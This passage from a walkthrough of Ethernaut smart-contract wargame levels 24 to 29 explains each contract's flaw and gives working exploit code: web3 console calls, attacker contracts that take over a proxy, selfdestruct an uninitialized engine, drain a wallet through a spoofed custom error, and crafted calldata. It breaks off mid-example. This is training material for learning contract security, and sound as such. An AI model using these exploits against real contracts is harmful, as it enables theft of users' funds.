    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

Our objective is to become the owner of the PuzzleProxy contract.

The PuzzleProxy contract is a proxy, which means that transactions are sent to
the proxy contract, which forwards those to the implementation contract. The
implementation contract is the PuzzleWallet contract.

If you inspect the contract a bit deeper, you will see that the proxy contract
uses delegatecall to forward the transactions to the implementation contract.
Delegatecall means, that the implementation contract is being executed
in the context of the proxy contract and the storage.

Let's look at the storage variables of the 2 contract:
Slot 0: `owner` in the PuzzleWallet contract
Slot 0: `pendingAdmin` in the PuzzleProxy contract

Slot 1: `maxBalance` in the PuzzleWallet contract
Slot 1: `admin` in the PuzzleProxy contract

Since the PuzzleWallet is executed in the context of the PuzzleProxy contract,
once we write to `owner`, we also overwrite `pendingAdmin` in the PuzzleProxy contract.
The same applies in the other direction - if we call the PuzzleProxy contract
and write to `pendingAdmin`, we also overwrite `owner` in the PuzzleWallet contract.

Let's see how we can become the owner of the PuzzleProxy contract:

To become the admin of the PuzzleProxy contract, we have to set the `admin` variable
in the contract. Since it overlaps with `maxBalance`, we need to set the `maxBalance`
variable to our address.

In order to set a new value for `maxBalance`, we have to call the `setMaxBalance`
function of the PuzzleWallet contract. But we can't do that, since we are not
whitelisted.

In order to get whitelisted, we have to call the `addToWhitelist` function of the
PuzzleWallet contract. But we can't do that, since we are not the owner.

But we see, that the `owner` variable is overlapping with the `pendingAdmin` variable
in the PuzzleProxy contract. We can set the `pendingAdmin` variable to our address
by calling the `proposeNewAdmin` function of the PuzzleProxy contract, since it
is external and does not have any restrictions.

Once we set the `pendingAdmin` variable to our address, we can call the 
`addToWhitelist` function, containing our address.

We passed the first restriction of the `setMaxBalance` function. But there is
a second restriction - the contract balance has to be 0.

The initial balance of the PuzzleWallet is `0.001 Eth`.  The only function which
reduces the balance of the contract is the `execute()` function. We would need to
call the `execute()` function and somehow drain the contract of its balance.

In order to call the `execute()` function and drain some value we need to have
some balance in the first place. So we need to check if there is a way for us to
deposit some balance in such a way that we are able to drain the contract.

We can call the `deposit()` function of the PuzzleWallet contract, but if we send
`0.001 Eth`, we will have a balance of `0.001 Eth`, but the contract has 
a balance of `0.002 Eth`. We need to deposit somehow more than `0.001 Eth` without
sending more than `0.001 Eth`.

Let's try looking `multicall()` by calling `deposit()` twice. Looking at the code
of the `multicall()` function, we can see that the `deposit()` function can only
be called once, due to the `depositCalled` variable.

`multicall()` allows to call multiple functions in one function call. What about
if we call `deposit()` and `multicall()` within a `multicall()` call?
That should work, since the `depositCalled` variable is a local variable and 
we would be able to call the `deposit()` function again, within a new `multicall()`
function call.

I copied the PuzzleProxy contract to Remix and loaded the instance from the
given instance address, to be able to call functions directly on the PuzzleProxy
contract.

Geez, sounds complicated. Let's try down the code which tailors everything together:


```javascript
// in remix
await contract.proposeNewAdmin("0xYourAddress") // you might click also just the proposeNewAdmin button
// in console
await contract.addToWhitelist(player)
const depositSignature = web3.eth.abi.encodeFunctionSignature("deposit()")
const firstMultiCallSignature = web3.eth.abi.encodeFunctionSignature("multicall(bytes[])")
const nestedMultiCallSig = web3.eth.abi.encodeFunctionCall({name: "multicall", type: "function", inputs: [{type: 'bytes[]', name: 'data'}]}, [[depositSignature]])
const actualMultiCallSig = web3.eth.abi.encodeFunctionCall({name: "multicall", type: "function", inputs: [{type: 'bytes[]', name: 'data'}]}, [[nestedMultiCallSig, depositSignature]])
await web3.eth.sendTransaction({from: player, to: contract.address, value: '1000000000000000',data: actualMultiCallSig.substring(2)})
const balanceOne = await getBalance(contract.address)
const balanceTwo = await contract.balances(player).then(v => v.toString())
// Last two commands should show the same amount
// if yes, we can continue
await contract.execute(player, 2000000000000000, '0x')
await contract.setMaxBalance(player)
```

And we are the owner :) Congratulations

### Learning

From the level:

>Next time, those friends will request an audit before depositing any money on a contract. Congrats!
>
>Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.
>
>Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract.

## Level 25: Motorbike <a name="level-25-motorbike"></a>

As always, let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

We have here a Motorbike which uses UUPS to call the Engine contract. We can
see that the Motorbike contract has a `_IMPLEMENTATION_SLOT` constant, which
is from EIP-1967. It just defines a slot in which the implementation contract's
address is stored in.

If we run `await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")`
we get a `bytes32` value, where the last 20 bytes are the address of the Engine
contract.

Nice, we already know where the engine contract is :)

What's actually our objective? We have to make the Motorbike unusable by
calling `selfdestruct` on the Engine contract.

Here comes the tricky part - the behaviour of `selfdestruct` depends on if the
network had the Dencun upgrade or not. Here a snippet from EIP-6780:

>The new functionality will be only to send all Ether in the account to the
>target, except that the current behaviour is preserved when SELFDESTRUCT
>is called in the same transaction a contract was created.

That means, a contract will only be destroyed if `selfdestruct` is called in the
same transaction as the contract was created.

Alright, let's first "exploit" pre-EIP6780.

The engine contract doesn't have a constructor, since the constructor sets the
state in the context of the Engine contract. The developer wants to use the
Engine of the Motorbike contract, and implemented therefore the `initialize`
function. We can see in the Motorbike constructor, that the `initialize` function
is called, in order to configure everything in the context of the Motorbike.

If we look at the documentation for [Writing Upgradable Contract](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializing_the_implementation_contract)
we can see the following sentence:

>Do not leave an implementation contract uninitialized.

Aha, and here we have an uninitialized Engine contract :) That's our way in.

But wait, the Engine contract doesn't have the `selfdestruct` instruction...

But it has `upgradeToAndCall` function, which allows us to upgrade the implementation
contract and call a function on the new implementation contract.

We are going to deploy a contract which has the `selfdestruct` instruction first:

```solidity
contract EngineDestroyer {
    function blowUpTheEngine() external {
        selfdestruct(payable(0));
    }
}
```

and call the following functions on the Engine contract itself:

```javascript
engineAddress = await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
engineAddress = '0x' + engineAddress.substring(26)

initializeSig = web3.eth.abi.encodeFunctionCall({name: "initialize", type: "function", inputs: []}, [])
await web3.eth.sendTransaction(from: player, to: engineAddress, data: initializeSig)
selfDestructContractAddress = '<address>'
selfDestructSig = web3.eth.abi.encodeFunctionSignature("blowUpTheEngine()")
upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}
upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, [selfDesturctContractAddress, selfDestructSig])
await web3.eth.sendTransaction({from: player, to: contract.address, data: upgradeData})
```
And that's it :)

Again, this should work for blockchain networks, where EIP-6780 is not implemented.

Next, let's see how we can solve this level with EIP-6780.

The behaviour of `selfdestruct` is only preserved if the contract is created and
destroyed in the same transaction. 

What does that mean for us? We have to create a contract, which is going to
request a new instance, and then destroy the instance in the same transaction.

Here a contract which does that:

```solidity
interface Engine {
    function initialize() external virtual;
    function upgradeToAndCall(address newImplementation, bytes memory data) external virtual;
}

contract MotorbikeExploiter {

    address constant ethernaut = 0xB877915d8Ba049e7cAFc1525F85CEc322A362767;
    address constant motorbikeLevel = 0xC0327531E3Be9A60566509d790aC89e99bd302C8;
    address motorbike;

    function exploit(uint256 nonce) public {
        (bool success,) = ethernaut.call(abi.encodeWithSignature("createLevelInstance(address)", motorbikeLevel));
        require(success, "Failed to create motorbike instance");

        Engine engine = Engine(computeAddress(motorbikeLevel, nonce));
        motorbike = computeAddress(motorbikeLevel, nonce + 1);

        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeCall(this.destroyEngine, ()));
    }

    function submitLevelInstance() public {
        // submit the instance
        (bool success,) = ethernaut.call(abi.encodeWithSignature("submitLevelInstance(address)", motorbike));
        require(success, "Failed to submit level instance");
    }

    function destroyEngine() external {
        selfdestruct(payable(0));
    }

    function computeAddress(address deployer, uint256 nonce) public pure returns (address) {
        // The integer zero is treated as an empty byte string, and as a result it only has a length prefix, 0x80, computed via 0x80 + 0.
        if (nonce == 0x00)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))));
        // A one byte integer uses its own value as its length prefix, there is no additional "0x80 + length" prefix that comes before it.
        if (nonce <= 0x7f)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))));

        // Nonces greater than 1 byte all follow a consistent encoding scheme, where each value is preceded by a prefix of 0x80 + length.
        if (nonce <= 2**8 - 1)  return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce))));
        if (nonce <= 2**16 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), uint16(nonce))));
        if (nonce <= 2**24 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), uint24(nonce))));

        // More details about RLP encoding can be found here: https://eth.wiki/fundamentals/rlp
        return addressFromLast20Bytes(
            keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), uint32(nonce)))
        );
    }

    function addressFromLast20Bytes(bytes32 bytesValue) private pure returns (address) {
        return address(uint160(uint256(bytesValue)));
    }
}
```

We hardcoded the address of the Ethernaut contract, which is responsible for
deploying new instance. Once we deploy this contract and call the
`exploit()` function, it is going to call the `createLevelInstance(address)` function
and request for a new instance.

Here now the tricky part - we need to know the address of the Motorbike and Engine
contract during the transaction itself. Since addresses of contracts are deterministic,
we can calculate the address of the Motorbike and Engine contract, based on the
nonce of the level address, which you can see in the console.

To get the current nonce of the level instance, just run
`web3.eth.getTransactionCount(<level instance address>)` and provide it to the
`exploit()` function.

Once the Motorbike and Engine contract are created, we do the same steps as
before - call `initialize()` and `upgradeToAndCall()` pointing to our contract
and the `destroyEngine()` function.

Once this transaction is done, we can submit the level. That has to be in a separate
transaction, since once we call `selfdestruct` the contract is scheduled for
removal right after the transaction is done. During the execution of the transaction,
the contract is still alive.

This is boiled down, which required some good amount of work :)

What's not so cool about it? The deployed exploit contract gets the credit for
solving the level, not the player. But hey, we are here to learn and not to
brag about it :)

Here the transaction where we exploited it: [Exploit Success](https://holesky.etherscan.io/tx/0x70fd3570946ad7925f72aeb30bf02e25bdc8640e81e37fd874e9ddaccc2a6340)

### Learning

Do not leave your logic contract uninitialized. Always make sure that the
contract is properly initialized.

## Level 26: DoubleEntryPoint <a name="level-26-double-entry-point"></a>

Let's have a look at the contracts first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/access/Ownable.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface DelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
    mapping(address => IDetectionBot) public usersDetectionBots;
    mapping(address => uint256) public botRaisedAlerts;

    function setDetectionBot(address detectionBotAddress) external override {
        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
    }

    function notify(address user, bytes calldata msgData) external override {
        if (address(usersDetectionBots[user]) == address(0)) return;
        try usersDetectionBots[user].handleTransaction(user, msgData) {
            return;
        } catch {}
    }

    function raiseAlert(address user) external override {
        if (address(usersDetectionBots[user]) != msg.sender) return;
        botRaisedAlerts[msg.sender] += 1;
    }
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if (forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(address to, uint256 value, address origSender)
        public
        override
        onlyDelegateFrom
        fortaNotify
        returns (bool)
    {
        _transfer(origSender, to, value);
        return true;
    }
}
```

Our objective is to make sure that CryptoValut contract does not get drained from
the tokens it holds, namely 100 DET and LGT tokens. This time we do not hack
anything but make it more secure. Also nice :0

First, let's see how one could drain the tokens from the CryptoVault contract.

The CryptoVault has a `sweepToken` function, which allows to transfer all tokens
from the contract to the `sweptTokensRecipient`. We can't provide the DET token
address, since it equals the `underlying` variable.

But what if we call the `sweepToken` function with the legacy token address?
We would pass the require statement and the `transfer` function of the LegacyToken
contract would be called. That's already something. Let's follow that path.

The `transfer` function of the LegacyToken contract has a check if the `delegate`
variable is set. If it is set, the `delegateTransfer` function of the DoubleEntryPoint
contract is called.

The `delegateTransfer()` function of the DoubleEntryPoint contract has two modifiers,
where the first checks if the caller is the LegacyToken contract and the second
one checks if the Forta contract raised an alert.

Since we call the `delegateTransfer()` function from the LegacyToken contract, we
pass the first modifier of the function.

Let's say no alarm is raised, the tokens of the CryptoVault are transferred to
`to`, which is `sweptTokensRecipient`. Even we do not own the tokens, the CryptoVault
contract looses the tokens, or rather gets drained of those.

That means, we have to protect this path, so it does not happen.

Now we need to write a contract, which raises an alarm during the execution of
the `delegateTransfer(address to, uint256 value, address origSender)` function when 
the `origSender` parameter equals to the Vault address.

Here is the contract:

```solidity
contract DetectionBot {
    address constant VAULT_ADDRESS = 0x5FB01487C07D122D211a6598E1AAc2D1d40F1c18;
    function handleTransaction(address user, bytes calldata msgData) external {
        (, , address origSender) = abi.decode(msgData[4:], (address, uint256, address));
        if (origSender == VAULT_ADDRESS) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}
```

Register it and we are done :)

### Learning

>Having tokens that present a double entry point is a non-trivial pattern that might affect many protocols. This is because it is commonly assumed to have one contract per token. But it was not the case this time :) You can read the entire details of what happened [here](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective).

## Level 27: Good Samaritan <a name="level-27-good-samaritan"></a>

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

Our objective is to drain the balance of the good samarithan contract.

let's first have a look how the contract works. We are able to request a donation
from the GoodSamaritan contract. What it does is to call the `donate10` function
of the Wallet contract. The Wallet contract checks if it has enough balance to
donate 10 coins. If it has, it donates 10 coins to the requester. If it doesn't
have enough balance, it reverts with a `NotEnoughBalance` error, triggering the
catch block in the `requestDonation` function of the GoodSamaritan contract,
which transfers the remaining balance to the requester.

Let's say, the GoodSamaritan contract has more than 10 coins, in that case
the Wallet contract calls the `transfer` function of the Coin contract, which
transfers 10 coins to the requester. During the transfer it also checks if the
destination address is a contract. If it is, it calls the `notify` function of
the contract.

Well, what to say, that's our way in.

You might ask - why? Custom errors in Solidity are carried up the call chain until
they are caught by a catch statement. All we have to do is to create a contract,
which reverts with a `NotEnoughBalance` error in the `notify` function call if 
`amount <= 10`, which get's caught by the catch statement in the `requestDonation`
function of the GoodSamaritan contract, and therefore transfers the remaining
balance to the requester.

Here is the contract:

```solidity
interface GoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}


contract Drainer {
    error NotEnoughBalance();

    function drain(address _samaritan) external {
        GoodSamaritan(_samaritan).requestDonation();
    }

    function notify(uint256 amount) public pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
```

Deploy and provide the address of the GoodSamaritan contract and we are done :)

### Learning

>Custom errors in Solidity are identified by their 4-byte ‘selector’, the same as a function call.
>They are bubbled up through the call chain until they are caught by a catch statement
>in a try-catch block, as seen in the GoodSamaritan's requestDonation() function.
>For these reasons, it is not safe to assume that the error was thrown by the
>immediate target of the contract call (i.e., Wallet in this case). Any other
>contract further down in the call chain can declare the same error and throw it
>at an unexpected location, such as in the notify(uint256 amount) function in your attacker contract.

## Level 28: Gaatekeeper Three <a name="level-28-gatekeeper-three"></a>

Another day for a hack :) Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```
Our goal is to become an `entract` of the GatekeeperThree contract by calling
the `enter()` function.

The `enter()` function of the GatekeeperThree contract has 3 modifiers:

1. `gateOne` - requires that the caller is the owner of the contract and the
transaction origin is not the owner.
2. `gateTwo` - requires that the `allowEntrance` variable is set to true.
3. `gateThree` - requires that the contract balance is greater than `0.001 ether`
and the owner receives `0.001 ether`.

Time to see how we can break each of the gates.

Let's start with `gateOne`. The `gateOne` modifier requires that the caller is
the owner of the contract and the transaction origin is not the owner. The
`tx.origin` variable returns the address of the account that initiated the transaction.
That means, we have to call the `enter()` function using a proxy contract.

When using a contract to call the `enter()` function, the `msg.sender` variable
is the contract address, and the `tx.origin` variable is the address of the
account that initiated the transaction.

But how do we become owner? The `construct0r` function is a typo and should be
`constructor`. That means, our proxy contract can call the `construct0r` function
and become the owner of the contract.


Here already a contract which breaks the `gateOne` modifier:

```solidity
interface GatekeeperThree {
    function construct0r() external;
    function enter() external;
}

contract GateBreaker {
    
    function enter(address _target) public {
        GatekeeperThree gkt = GatekeeperThree(_target);
        gkt.construct0r();
        gkt.enter();
    }
}
```

Next, let's break the `gateTwo` modifier. The `gateTwo` modifier requires that
the `allowEntrance` variable is set to true. The `allowEntrance` variable is
set to true in the `getAllowance` function of the GatekeeperThree contract only
if the `checkPassword` function of the SimpleTrick contract returns true.

Having a look into the `checkPassword` function of the SimpleTrick contract,
we see that the `password` variable is a state variable which holds the block
timestamp. Alright, now let's see if the `SimpleTrick` contract also deployed
while we request for a new instance of the `GatekeeperThree` contract. If not,
we need to have a look into it, how that works.

Let's see first, if the `trick` variable of the GatekeeperThree contract is set
to the address of the `SimpleTrick` contract.

In the console run `await contract.trick()`. It returns the zero address, which
means that the `trick` variable is not set. That means we need to deploy it first.

We see, that we `GatekeeperThree` contract has a `createTrick` function, which
deploys a new instance of the `SimpleTrick` contract and sets the `trick` variable
to the address of the new instance.

During the deployment of the `SimpleTrick` contract, the `password` variable is
set to the block timestamp. That means, we can call the `checkPassword` function
by providing the block timestamp as the `_password` parameter.

Here our proxy contract extended with the new information:

```solidity
interface GatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function enter() external;
    function getAllowance(uint256 _password) external;
}

contract GateBreaker {
    
    function enter(address _target) public {
        GatekeeperThree gkt = GatekeeperThree(_target);
        gkt.construct0r();

        gkt.createTrick();
        gkt.getAllowance(block.timestamp);

        gkt.enter();
    }
}
```

Now, let's break the `gateThree` modifier. The `gateThree` modifier requires
that the contract balance is greater than `0.001 ether` and the owner receives
`0.001 ether`.

We can simply send some Eth to our proxy and forward that to the
`GatekeeperThree` contract. It has a `receive` function which allows to send
Eth to the contract.

Now regarding the `.send()` function - it tries to send `0.001` Eth to the
owner of the contract. The `.send()` function returns false if the transfer
fails. That means, we can send `0.0011` Eth to the contract and the transfer
back to the owner has to fail.

Let's add that part to our proxy contract:

```solidity
interface GatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function enter() external;
    function getAllowance(uint256 _password) external;
}

contract GateBreaker {
    
    function enter(address _target) public payable {
        GatekeeperThree gkt = GatekeeperThree(_target);
        gkt.construct0r();

        gkt.createTrick();
        gkt.getAllowance(block.timestamp);

        payable(_target).transfer(msg.value);
        gkt.enter();
    }
}
```

Let's give it a try :) Deploy your proxy contract and call the `enter()` function
with the address of the `GatekeeperThree` contract and send `0.0011` Eth.

And we are an entrant of the `GatekeeperThree` contract :)

### Learning

Not sure what new stuff we learned here, but it is always good to see how
contracts can be exploited and practice our skills :)

## Level 29: Switch <a name="level-29-switch"></a>

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

The contract gets deployed and the comment tells us that the `switchOn` variable
is set to false. Our goal is to turn the switch to on.

The only function we can call is the `flipSwitch` function. The `flipSwitch`
function has one modifier, the `onlyOff` modifier. The `onlyOff` modifier checks
if the 4 bytes at the 68th position of the calldata is equal to the `offSelector`
variable, which holds the signature of the `turnSwitchOff()` function.

If it is, the modifier passes and the `flipSwitch` function calls the `turnSwitchOff`
function. 

Question: How do we pass this level? Let's have a look how dynamic parameters
(since we have bytes as a parameter) are passed to a function in Solidity.

Whenever we call the `flipSwitch` function, the first 4 bytes of the calldata
are the function selector `0x30c13ade = keccak256("flipSwitch(bytes)")`.
After those 4 bytes comes the parameter, which is a dynamic type.

The first 32 bytes of the dynamic type represent the offset of the data in the
calldata. At the offset you will find first the lenght of the data, followed
by the data itself.

Here an example for calling `flipSwitch` with `0x20606e15` as parameter.

```solidity
30c13ade
0000000000000000000000000000000000000000000000000000000000000020 //offset
 ^-start counting offset from here
0000000000000000000000000000000000000000000000000000000000000004 // length of data
 ^-0x20 offset
20606e1500000000000000000000000000000000000000000000000000000000 // data
```

The `onlyOff` modifier reads the data from a specific location from the calldata,
68 bytes from the start of the calldata. That means, we have to provide the
`offSelector` at that particular location.

Let's modify the data we provide to the `flipSwitch` function, where we just move
the real data, which is required to call the `turnSwitchOn` function:

```solidity
30c13ade
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000000
20606e1500000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000004
